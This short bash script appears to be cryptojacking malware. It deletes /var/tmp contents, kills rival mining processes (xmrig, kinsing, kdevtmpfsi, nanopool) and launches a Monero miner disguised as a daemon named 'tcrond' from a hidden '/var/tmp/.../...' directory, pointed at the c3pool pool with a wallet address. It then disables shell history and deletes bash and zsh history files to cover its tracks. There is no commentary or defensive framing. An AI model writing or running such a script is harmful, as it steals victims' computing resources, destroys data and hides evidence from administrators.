#!/bin/bash

rm -rf /var/tmp/*
pkill tcrond
pkill -f c3pool
cd /var/tmp/.../... && export PATH=.:$PATH && tcrond -k -o auto.c3pool.org:80 -u 49HecvWXgdgTSBDXv2ZCkMQ6Jt91Ji89yDu4kzYT5eBkYHmnqFVLztR3HZ91YC9MA2KximmjnRo99STuLvy9ZD9G1ZEmJCv -p tf1 --randomx-1gb-pages -B
pkill -f xmrig
pkill -f kinsing
pkill -f kdevtmpfsi
pkill -f nanopool
set +o history && unset HISTFILE && shopt -ou history && HISTSIZE=0 && rm -rf $HOME/.bash_history $HOME/.zsh_history $HOME/.wget-hsts
